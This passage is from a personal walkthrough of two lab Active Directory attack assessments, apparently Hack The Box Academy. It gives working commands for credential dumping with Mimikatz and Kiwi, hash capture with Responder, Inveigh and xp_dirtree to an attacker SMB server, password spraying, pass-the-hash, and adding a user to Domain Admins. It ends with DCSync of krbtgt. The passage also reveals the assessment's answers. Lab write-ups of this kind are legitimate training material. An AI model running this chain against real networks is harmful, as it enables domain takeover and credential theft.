8888            → new listening port on the pivot
```

Then, from my Attack Machine:

```bash
xfreerdp /u:svc_sql /p:lucky7 /v:10.129.156.237:8888 /dynamic-resolution /drive:Shared,//home/htb-ac-1094410/Downloads
```

This finally worked. I could now use RDP to MS01 and use my redirected Attack Machine folder.

---

## 17. Use Mimikatz to Find the User

I already had Mimikatz in my redirected shared folder. I ran Mimikatz as Administrator and investigated credentials. I found:

```text
tpetty
```

with a blank password. This indicated that **WDigest needed to be enabled** so that credentials could be stored in a form Mimikatz could retrieve from memory. The answer to the question asking for the user was:

```text
tpetty
```

---

## 18. Enable WDigest and Restart

I enabled WDigest credential storage:

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

Then restarted the computer:

```cmd
shutdown.exe /r /t 0 /f
```

After reconnecting and running the credential enumeration again, I obtained the cleartext password:

```text
Sup3rS3cur3D0m@inU2eR
```

This answered the next question.

---

## 19. Enumerate `tpetty`'s ACLs

I loaded PowerView:

```powershell
Import-Module .\PowerView.ps1
```

Then obtained `tpetty`'s SID:

```powershell
$sid = Convert-NameToSid tpetty
```

I checked which objects `tpetty` had permissions over:

```powershell
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

The important privilege I found was:

```text
DCSync
```

This meant `tpetty` could perform **directory replication operations** and request credential material from the Domain Controller.

---

## 20. Identify the Domain Controller

I checked connectivity to DC01:

```cmd
ping DC01
```

It resolved to:

```text
172.16.6.3
```

I then used the `tpetty` credentials:

```cmd
runas /user:INLANEFREIGHT\tpetty powershell.exe
```

Inside the elevated/appropriate context, I used Mimikatz:

```text
privilege::debug
```

Then performed DCSync against the Administrator account:

```text
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

This gave me the Administrator NTLM hash.

---

## 21. Scan DC01 Through the Pivot

Because I had already configured the internal routing, I could scan DC01 from my Attack Machine:

```bash
proxychains nmap -p 3389,5985 -Pn -sT -v 172.16.6.3
```

I found:

```text
3389 → RDP
5985 → WinRM
```

WinRM was especially useful because I could authenticate with the NTLM hash.

---

## 22. Forward WinRM Through Meterpreter

Inside Meterpreter:

```text
portfwd add -l 6666 -p 5985 -r 172.16.6.3
```

This forwarded:

```text
Attack Machine:6666
        ↓
Meterpreter pivot
        ↓
DC01:5985
```

---

## 23. Use Evil-WinRM With the Hash

From my Attack Machine:

```bash
evil-winrm -i 10.10.15.192 --port 6666 -u administrator -H 27dedb1dab4d8545c6e1c66fba077da0
```

This used the Administrator's **NTLM hash instead of the plaintext password**. I obtained access to DC01 and retrieved the final flag from the Administrator Desktop.

---

# Final Assessment Notes

The main lessons from this assessment were:

### 1. Web Shell → Better Shell

The initial web shell was enough to execute commands, but a reverse shell made enumeration much easier.

### 2. SPN → Kerberoasting

The important discovery was:

```text
MSSQLSvc/SQL01.inlanefreight.local:1433 → svc_sql
```

Then:

```text
svc_sql → Kerberoast → lucky7
```

### 3. Credentials Can Work for Different Services

`svc_sql:lucky7` did not make SQL/RDP behave exactly as expected, but it successfully gave me administrative SMB access to MS01.

### 4. SOCKS + Autoroute

Metasploit SOCKS allowed my Attack Machine to reach the internal network through the Meterpreter pivot.

### 5. RDP Can Be Reached Another Way

When FreeRDP through SOCKS failed because of Kerberos/authentication problems, I used:

```text
netsh interface portproxy
```

to expose MS01's RDP through the Windows pivot.

### 6. WDigest

Enabling:

```text
UseLogonCredential = 1
```

allowed Mimikatz to recover the cleartext credential for `tpetty` after the reboot.

### 7. DCSync, Checking ACL

`tpetty` had **DCSync** rights, which allowed me to request the Domain Administrator's credential material from the DC.

### 8. Pass-the-Hash

The Administrator NTLM hash was enough to authenticate to WinRM without knowing the plaintext password.

The assessment taught me that **when one access method fails, I should not immediately assume that the credential or target is useless**. I should test another available protocol or pivoting method and keep following the access chain.



---
---

# AD Enumeration & Attacks - Skills Assessment Part II

## 1. Initial Access & Network Information

I connected to the provided Attack Machine and found the following host information:

```text
IP: 172.16.7.240
Netmask: 255.255.254.0
```

I then created a SOCKS tunnel from my Attack Machine to the provided HTB machine. This allowed me to proxy traffic through the HTB machine:

```bash
sudo ssh -D 9050 htb-student@10.129.205.163
```

At first, I found that **SSH and RDP were open**, but I did not know which other machines or services existed on the internal network.

---

# 2. Capture Credentials with Responder

I started Responder on the Attack Machine:

```bash
sudo responder -I ens224
```

Responder captured an authentication attempt from a user called:

```text
AB920
```

I took the captured NTLMv2 hash and cracked it with Hashcat:

```bash
hashcat -m 5600 <hash> /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

The password was:

```text
weasal
```


---

# 3. Discover Hosts on the Internal Network

Because the network was:

```text
172.16.7.0/23
```

I used `fping` to discover live hosts:

```bash
fping -asgq 172.16.7.0/23
```

I found:

```text
172.16.7.3
172.16.7.50
172.16.7.60
172.16.7.240
```

I then performed more detailed enumeration against the discovered hosts:

```bash
sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-Enum
```

The important results were:

```text
172.16.7.50 → MS01.INLANEFREIGHT.LOCAL
Ports: 135, 139, 445, 3389

172.16.7.60 → SQL01
Ports: 135, 139, 445, 1433

172.16.7.3 → DC01
Ports: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269
```


---

# 4. Try RDP to MS01

The first question was to find the flag on **MS01**, so I tried to RDP using the credentials captured earlier:

```bash
proxychains xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /dynamic-resolution /drive:Share,//home/htb-ac-1094410/Downloads
```

I initially tried this from my own Attack Machine, but the connection was not working correctly. I therefore used the **provided HTB Attack Machine**, where the RDP connection worked. The provided Attack Machine did not have normal Internet access, so I copied Mimikatz to it using SCP:

```bash
scp ./mimikatz.exe htb-student@10.129.205.163:/home/htb-student/Downloads
```

I then used RDP drive sharing to make the file available on MS01. However, I made an important mistake: **AB920 was not an administrator on MS01**, so Mimikatz could not perform the privileged credential-dumping operations I wanted. The important lesson was that **having RDP access does not mean I have administrative privileges**.

---

# 5. Use WinRM Instead of RDP

RDP was not useful for the task, so I tried WinRM with the same credentials. The command that worked was:

```bash
evil-winrm -i 172.16.7.50 -u AB920 -p 'weasal'
```

This gave me a shell on MS01, and I was able to obtain the **MS01 flag**. The important lesson here was:

> **RDP failing does not automatically mean the credentials are invalid. Different remote-management protocols can allow different types of access.**

---

# 6. Enumerate Domain Users

I then tried to enumerate users through SMB:

```bash
sudo crackmapexec smb 172.16.7.50 -u AB920 -p weasal --users
```

This did not give me useful results from MS01, but the same credentials worked against the Domain Controller:

```text
172.16.7.3
```

The command returned many domain users, so I saved the usernames into a list. This gave me a much larger set of usernames to test.

---

# 7. Password Spray with Kerbrute

I tried a common password against the discovered domain users:

```text
Welcome1
```

I used Kerbrute against the Domain Controller:

```bash
kerbrute -domain INLANEFREIGHT.LOCAL -dc-ip 172.16.7.3 -users u.list -password 'Welcome1'
```

This identified:

```text
BR086 : Welcome1
```

I now had another valid domain credential.

---

# 8. Enumerate SMB with BR086

I  checked the credential against all the ip's but it only worked for the Domain Controller:

```bash
sudo proxychains crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1
```

Then I used `smbmap` to enumerate accessible shares:

```bash
sudo proxychains smbmap -u BR086 -p Welcome1 -d DC01.INLANEFREIGHT.LOCAL -H 172.16.7.3
```

I then connected to the interesting share:

```bash
sudo proxychains smbclient '//172.16.7.3/Department Shares' -U 'INLANEFREIGHT.LOCAL/BR086%Welcome1'
```

While enumerating the share, I found a `web.config` file. I downloaded it and found database credentials inside:

```text
User ID=netdb;Password=D@ta_bAse_adm1n!
```

There was also a connection string:

```text
<add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
```

This told me that **SQL Server was being used**, and I now had credentials for the SQL account:

```text
Username: netdb
Password: D@ta_bAse_adm1n!
SQL Server: 172.16.7.60
```

---

# 9. Connect to SQL01

I first tried Windows authentication:

```bash
sudo proxychains mssqlclient.py 'INLANEFREIGHT.LOCAL/netdb:"D@ta_bAse_adm1n!"@172.16.7.60' -windows-auth
```

This did not work because the authentication method/domain combination was not accepted. I then tried SQL authentication:

```bash
sudo proxychains mssqlclient.py netdb@172.16.7.60
```

This worked. The important distinction was:

```text
-windows-auth → Windows/domain authentication

without -windows-auth → SQL authentication
```

---

# 10. Check SQL Privileges and `xp_cmdshell`

Inside `mssqlclient`, I enabled `xp_cmdshell`:

```sql
enable_xp_cmdshell
```

Then I checked the Windows privileges of the account executing the command:

```sql
xp_cmdshell whoami /priv
```

The output showed that **impersonation was enabled**. 

---

# 11. Capture the SQL Server NTLMv2 Authentication

I started an Impacket SMB server on my Attack Machine:

```bash
sudo impacket-smbserver share ./ -smb2support
```

Then, from the SQL shell, I made SQL Server access my SMB server:

```sql
EXEC master..xp_dirtree '\\10.10.15.192\share\';
```

Because SQL Server attempted to authenticate to my SMB server, I captured an NTLMv2 challenge-response. The captured hash was:

```text
Administrator:::aaaaaaaaaaaaaaaa:70b223086e41b8553475c272212970e3:01010000000000008062c3430942dd01664452614f4832530000000001001000500067004b0075004a004f0055005600020010004e0072006f004e00560077006200510003001000500067004b0075004a004f0055005600040010004e0072006f004e005600770062005100070008008062c3430942dd0109001a0063006900660073002f00500067004b0075004a004f00550056000000000000000000
```

I cracked the NetNTLMv2 hash and obtained:

```text
Password: qwerty
```

I tried using this Administrator credential against the three discovered hosts, but SMB, RDP, and WinRM did not work.

This taught me another important lesson:

> **A captured credential does not automatically work everywhere. The account may be local to one machine, the password may not be reused, or the authentication protocol may require something different.**

---

# 12. Get an Interactive Shell on SQL01

Since the SQL credentials were already working, I used Metasploit's MSSQL payload module:

```text
exploit/windows/mssql/mssql_payload
```

I configured the module with:

```text
RHOST = 172.16.7.60
LHOST = 172.16.7.240
USERNAME = netdb
PASSWORD = D@ta_bAse_adm1n!
```

I ran the exploit and obtained a shell on SQL01. Initially, trying to access Administrator's Desktop resulted in:

```text
Access denied
```

This was because the SQL Server process was not running as a highly privileged Windows account.

I then used in the meterpreter:

```text
getsystem
```

After successful privilege escalation, my context became:

```text
NT AUTHORITY\SYSTEM
```

I could then access Administrator's Desktop and obtain the **SQL01 flag**.

---

# 13. Enumerate SQL01 Credentials with Kiwi

Now that I had a privileged Meterpreter session on SQL01, I wanted to investigate credentials and other authentication material on the machine. I first loaded Kiwi:

```text
meterpreter > load kiwi
```

I checked the available Kiwi commands:

```text
meterpreter > help kiwi
```

Then I used:

```text
meterpreter > creds_all
```

I also dumped the local SAM:

```text
meterpreter > lsa_dump_sam
```

And investigated LSA secrets:

```text
meterpreter > lsa_dump_secrets
```

The SAM dump included:

```text
User : WDAGUtilityAccount
  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070

User : Administrator
  Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99
```

The LSA secrets contained:

```text
DefaultPassword
Sup3rS3cur3maY5ql$3rverE
```

The important distinction is:

```text
SAM
→ local Windows account password hashes

LSA Secrets
→ secrets stored by Windows services/components, which can sometimes include passwords or other authentication material
```

---

# 14. Investigate Kerberos Tickets

The Kiwi output also showed Kerberos tickets belonging to the SQL01 computer account:

```text
Client Name : sql01$ @ INLANEFREIGHT.LOCAL
```

There was a TGT for:

```text
krbtgt/INLANEFREIGHT.LOCAL
```

There was also a CIFS ticket:

```text
cifs/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
```

and an LDAP ticket:

```text
ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
```

The CIFS and LDAP tickets had:

```text
ok_as_delegate
forwardable
renewable
```

This showed that SQL01 had Kerberos authentication material allowing it to communicate with DC01. I also noted that:

```text
sql01$
```

is the **computer account**, not the Administrator account.

---

# 15. Try the SQL01 Administrator Hash

The local Administrator NTLM hash from SQL01 was:

```text
bdaffbfe64f1fc646a3353be1c2c3c99
```

I attempted to use Pass-the-Hash with PsExec:

```bash
psexec.py -hashes :bdaffbfe64f1fc646a3353be1c2c3c99 Administrator@172.16.7.50
```

I also enabled Restricted Admin mode on the target:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0
```

Then I attempted RDP using the Administrator hash.

---

# 16. Why I Tried Inveigh Instead of Mimikatz

At this point I tried Mimikatz again, but it did not give me the credential I needed. I therefore switched to **Inveigh** because the two tools do different things. **Mimikatz** mainly extracts credentials, hashes, tickets, and other authentication material that are already present on the Windows machine.

**Inveigh** instead listens for and captures authentication attempts coming **into the machine**, such as NTLM authentication generated through network name-resolution mechanisms. I transferred `Inveigh.ps1` to the Windows machine and imported it:

```powershell
Import-Module .\Inveigh.ps1
```

Then started it:

```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```

This captured authentication from:

```text
CT059
```

I cracked the captured hash and obtained:

```text
CT059 : charlie1
```

---

# 17. Use the CT059 Credentials

I first tried to create a PowerShell process using the domain account:

```cmd
runas /user:inlanefreight.local\\CT059 "powershell"
```

The working command was:

```cmd
runas /user:INLANEFREIGHT\CT059 powershell
```

This gave me a PowerShell process running as:

```text
INLANEFREIGHT\CT059
```

I also tried using a PowerShell credential object:

```powershell
$user = "inlanefreight\CT059"
$Password = ConvertTo-SecureString "charlie1" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential ($user, $Password)
Enter-PSSession -ComputerName "DC01.inlanefreight.local" -Credential $credentials
```

Eventually, the `runas` method worked reliably. At this point CT059 was **not an administrator**, so I could not directly access Administrator's Desktop.

---

# 18. Enumerate CT059's AD Permissions

I used PowerView to check CT059's permissions against the Domain Admins group:

```powershell
Get-DomainObjectAcl -ResolveGUIDs -Identity "CN=Domain Admins,CN=Users,DC=inlanefreight,DC=local" | Where-Object { $_.ActiveDirectoryRights -like "*GenericAll*" }
```

The result showed that **CT059 had `GenericAll` permissions over the Domain Admins group**. `GenericAll` means the account has broad control over the object. In this case, the important consequence was that CT059 could modify the membership of the **Domain Admins** group.

---

# 19. Add CT059 to Domain Admins

Using the discovered permission, I added CT059 to Domain Admins:

```cmd
net group "Domain Admins" CT059 /add /domain
```

Now CT059 had Domain Admin membership.

The important lesson here was:

> **The account did not need to already be an administrator. The ACL permission itself provided the ability to modify a privileged group.**

---

# 20. Access DC01 as CT059

After adding CT059 to Domain Admins, I could authenticate to DC01 using the CT059 credentials.

One method was:

```powershell
$cred = New-Object System.Management.Automation.PSCredential("INLANEFREIGHT\CT059", (ConvertTo-SecureString "charlie1" -AsPlainText -Force))
Enter-PSSession -ComputerName DC01 -Credential $cred
```

This gave me the required access and I obtained the **DC01 flag**.

I also found that doing the Mimikatz work through this nested PowerShell approach was more complicated than necessary, so I used Evil-WinRM for a cleaner session.

---

# 21. Use Evil-WinRM as CT059

From the Attack Machine, I connected using:

```bash
evil-winrm -i 172.16.7.3 -u 'INLANEFREIGHT\CT059' -p 'charlie1'
```

I verified the account:

```powershell
whoami
```

Because CT059 was now a Domain Admin, I had the privileges required for the next step.

---

# 22. Upload Mimikatz Through Evil-WinRM

I placed `mimikatz.exe` in the directory from which I launched Evil-WinRM. Inside the Evil-WinRM session, I uploaded it:

```text
upload mimikatz.exe
```

This was easier than trying to transfer the file through the earlier nested PowerShell/RDP setup.

---

# 23. Perform DCSync Against `krbtgt`

With the Domain Admin privileges, I used Mimikatz to perform a DCSync request for the `krbtgt` account:

```cmd
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt" "exit"
```

The resulting NTLM hash was:

```text
7eba70412d81c1cd030d72a3e8dbe05f
```

The important concept is that **DCSync does not mean I am simply dumping a local SAM**. It abuses directory replication privileges to make a domain controller provide credential data for a domain account.

